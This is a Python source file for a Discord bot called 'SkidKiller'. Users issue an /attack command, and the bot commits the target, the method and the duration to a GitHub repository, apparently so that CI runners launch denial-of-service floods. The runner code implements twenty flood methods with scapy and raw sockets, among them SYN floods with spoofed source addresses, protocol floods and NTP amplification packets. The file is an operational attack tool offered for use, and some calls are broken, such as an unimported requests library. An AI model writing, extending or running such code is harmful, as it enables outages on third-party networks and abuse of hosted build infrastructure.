import discord
from discord.ext import commands
from discord import app_commands
import json
import os
from github import Github
from datetime import datetime
import random, time, socket
from scapy.all import *

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
GITHUB_TOKEN = os.getenv("GIT_TOKEN")
REPO_NAME = "KomaVR/SkidKiller"
BRANCH = "main"
CONFIG_FILE = "trigger.json"

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

working_methods = [
    "tcp_chained_syn", "ssl_fragment_flood", "websocket_spam", "jumbo_payload_overlap",
    "http_mutator", "json_object_injection", "illegal_tcp_flags", "fake_protocol_mix",
    "gre_flood", "reverse_byte_flood", "igmp_bomb", "eigrp_flood", "ospf_flood",
    "l2tp_flood", "sctp_chunk_storm", "isakmp_flood", "ntp_amplify",
    "malformed_http_headers", "tcp_option_abuse", "coap_flood"
]

@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"Bot is live. Synced {len(synced)} commands.")
    except Exception as e:
        print(f"Sync failed: {e}")

@bot.tree.command(name="attack", description="Launch a SkidKiller attack swarm")
@app_commands.describe(
    target_ip="Target IP or domain",
    method="Choose attack method",
    threads="Number of concurrent runners (1–100)",
    duration="How long the attack runs (10–3600 seconds)"
)
@app_commands.choices(method=[
    app_commands.Choice(name=m.replace("_", " ").title(), value=m) for m in working_methods
])
async def attack(interaction: discord.Interaction, target_ip: str, method: app_commands.Choice[str], threads: int, duration: int):
    if not (1 <= threads <= 100):
        await interaction.response.send_message("Threads must be between 1–100.", ephemeral=True)
        return
    if not (10 <= duration <= 3600):
        await interaction.response.send_message("Duration must be 10–3600 seconds.", ephemeral=True)
        return

    config = {
        "ip": target_ip,
        "method": method.value,
        "threads": threads,
        "duration": duration,
        "timestamp": str(datetime.utcnow())
    }

    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

    try:
        g = Github(GITHUB_TOKEN)
        repo = g.get_repo(REPO_NAME)

        with open(CONFIG_FILE, "r") as f:
            content = f.read()

        try:
            contents = repo.get_contents("trigger.json", ref=BRANCH)
            repo.update_file(
                path=contents.path,
                message="Update trigger.json",
                content=content,
                sha=contents.sha,
                branch=BRANCH
            )
        except Exception as inner:
            if "404" in str(inner):
                repo.create_file(
                    path="trigger.json",
                    message="Create trigger.json",
                    content=content,
                    branch=BRANCH
                )
            else:
                raise inner

        await interaction.response.send_message(
            f"✅ Target: `{target_ip}` | Method: `{method.value}` | Threads: `{threads}` | Duration: `{duration}`s"
        )

    except Exception as e:
        await interaction.response.send_message(f"❌ GitHub push failed: {e}", ephemeral=True)

@bot.tree.command(name="help", description="Show all available attack methods")
async def help_cmd(interaction: discord.Interaction):
    methods = "\\n".join(f"- `{m}`" for m in working_methods)
    await interaction.response.send_message(f"**SkidKiller Methods:**\\n{methods}", ephemeral=True)

@bot.tree.command(name="status", description="Show current attack configuration")
async def status(interaction: discord.Interaction):
    try:
        with open(CONFIG_FILE, "r") as f:
            config = json.load(f)
            msg = (
                f"**Target Config:**\\n"
                f"> IP: `{config['ip']}`\\n"
                f"> Method: `{config['method']}`\\n"
                f"> Threads: `{config['threads']}`\\n"
                f"> Duration: `{config['duration']}s`\\n"
                f"> Time: `{config['timestamp']}`"
            )
    except:
        msg = "trigger.json not found."
    await interaction.response.send_message(msg, ephemeral=True)

def runner_mode():
    with open("trigger.json", "r") as f:
        config = json.load(f)

    ip = config["ip"]
    method = config["method"]
    duration = config["duration"]
    end_time = time.time() + duration

    def wrap(func): return lambda ip=ip: func(ip) if 'port' not in func.__code__.co_varnames else func(ip, 80)
    def loop_payload(func): 
        while time.time() < end_time: 
            try: func(ip)
            except: pass
            time.sleep(0.01)

    def tcp_chained_syn(ip, port):
        spoof = ".".join(str(random.randint(1, 254)) for _ in range(4))
        base = IP(src=spoof, dst=ip)
        send(base/TCP(sport=RandShort(), dport=port, flags='S'), verbose=0)
        for _ in range(3):
            send(base/TCP(sport=RandShort(), dport=port, flags='A'), verbose=0)

    def ssl_fragment_flood(ip, port): s = socket.socket(); s.settimeout(1); s.connect((ip, port)); s.send(b"\\x16\\x03\\x01\\x02"); s.close()
    def websocket_spam(ip, port): s = socket.socket(); s.connect((ip, port)); s.send(b"GET /ws HTTP/1.1\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\n\\r\\n"); [s.send(os.urandom(1024)) for _ in range(10)]; s.close()
    def jumbo_payload_overlap(ip): send(IP(dst=ip)/UDP(dport=53)/Raw(load=os.urandom(9200)), verbose=0)
    def http_mutator(ip): headers = {"User-Agent": f"Mutator-{random.randint(1000,9999)}", "X-Custom": os.urandom(10).hex()}; methods = ["GET","POST","PUT","PATCH","TRACE"]; requests.request(random.choice(methods), f"http://{ip}", headers=headers, timeout=2)
    def json_object_injection(ip): requests.post(f"http://{ip}", json={"key": ["X"*500]*10000}, timeout=2)
    def illegal_tcp_flags(ip, port): send(IP(dst=ip)/TCP(dport=port, flags="FU")/Raw(load=os.urandom(256)), verbose=0)
    def fake_protocol_mix(ip): send(IP(dst=ip)/UDP(dport=443)/Raw(load=b"\\x16\\x03\\x01" + os.urandom(512)), verbose=0)
    def gre_flood(ip): send(IP(dst=ip, proto=47)/Raw(load=os.urandom(1024)), verbose=0)
    def reverse_byte_flood(ip): send(IP(dst=ip)/UDP(dport=123)/Raw(load=bytes([random.randint(0, 255) for _ in range(512)])[::-1]), verbose=0)
    def igmp_bomb(ip): send(IP(dst=ip, proto=2)/Raw(load=os.urandom(512)), verbose=0)
    def eigrp_flood(ip): send(IP(dst=ip, proto=88)/Raw(load=os.urandom(1024)), verbose=0)
    def ospf_flood(ip): send(IP(dst=ip, proto=89)/Raw(load=os.urandom(512)), verbose=0)
    def l2tp_flood(ip): send(IP(dst=ip, proto=115)/Raw(load=os.urandom(1024)), verbose=0)
    def sctp_chunk_storm(ip): send(IP(dst=ip, proto=132)/Raw(load=os.urandom(1024)), verbose=0)
    def isakmp_flood(ip): send(IP(dst=ip)/UDP(dport=500)/Raw(load=os.urandom(512)), verbose=0)
    def ntp_amplify(ip): send(IP(dst=ip)/UDP(dport=123)/Raw(load=b'\\x17\\x00\\x03\\x2a' + os.urandom(4)), verbose=0)
    def malformed_http_headers(ip, port): headers = "GET / HTTP/1.1\\r\\nHost: {ip}\\r\\n" + "\\r\\n".join(f"X-Hax-{i}: {os.urandom(100).hex()}" for i in range(10)) + "\\r\\n\\r\\n"; s = socket.socket(); s.connect((ip, port)); s.send(headers.encode()); s.close()
    def tcp_option_abuse(ip, port): opts = [(1, b'\\x01'), (2, b'\\x04\\x05\\xb4'), (3, b'\\x03'), (4, b'\\x02'), (8, os.urandom(8))]; pkt = IP(dst=ip)/TCP(dport=port, flags='S', options=opts)/Raw(load=os.urandom(256)); send(pkt, verbose=0)
    def coap_flood(ip): msg_type = random.randint(0, 3) << 4; code = random.randint(0, 255); msg_id = os.urandom(2); token = os.urandom(4); coap = bytes([0x40 | msg_type, code]) + msg_id + token; pkt = IP(dst=ip)/UDP(dport=5683)/Raw(load=coap + os.urandom(12)); send(pkt, verbose=0)

    method_map = {
        "tcp_chained_syn": tcp_chained_syn, "ssl_fragment_flood": ssl_fragment_flood,
        "websocket_spam": websocket_spam, "jumbo_payload_overlap": jumbo_payload_overlap,
        "http_mutator": http_mutator, "json_object_injection": json_object_injection,
        "illegal_tcp_flags": illegal_tcp_flags, "fake_protocol_mix": fake_protocol_mix,
        "gre_flood": gre_flood, "reverse_byte_flood": reverse_byte_flood,
        "igmp_bomb": igmp_bomb, "eigrp_flood": eigrp_flood, "ospf_flood": ospf_flood,
        "l2tp_flood": l2tp_flood, "sctp_chunk_storm": sctp_chunk_storm,
        "isakmp_flood": isakmp_flood, "ntp_amplify": ntp_amplify,
        "malformed_http_headers": malformed_http_headers, "tcp_option_abuse": tcp_option_abuse,
        "coap_flood": coap_flood
    }

    if method in method_map:
        while time.time() < end_time:
            try:
                method_map[method](ip)
                time.sleep(0.01)
            except:
                continue

if __name__ == "__main__":
    if os.getenv("RUNNER_MODE") == "1":
        runner_mode()
    else:
        bot.run(DISCORD_TOKEN)
